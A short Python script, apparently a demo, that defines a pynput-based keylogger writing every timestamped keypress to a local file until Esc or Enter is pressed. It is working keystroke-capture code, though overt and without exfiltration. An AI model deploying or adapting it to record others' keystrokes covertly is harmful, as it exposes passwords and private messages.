import pynput
from datetime import datetime

class Keylogger:
    def __init__(self):
        self.listener = None

    def start_logging(self):
        """Starts the keylogger."""
        self.listener = pynput.keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()

    def stop_logging(self):
        """Stops the keylogger."""
        if self.listener:
            self.listener.stop()

    def on_press(self, key):
        try:
            key_str = str(key.char)
        except AttributeError:
            key_str = str(key) 

        with open("key_logger.txt", "a") as f:
            now = datetime.now()
            timestamp = now.strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] {key_str} ") 

    def on_release(self, key):
        if key == pynput.keyboard.Key.esc: 
            self.stop_logging()

# Create an instance of the Keylogger
keylogger = Keylogger()

# Start logging 
keylogger.start_logging()

# You can now control the keylogger programmatically:
# keylogger.stop_logging() 

# Keep the program running 
input("Start pressing the keys and press Enter after completion to exit.")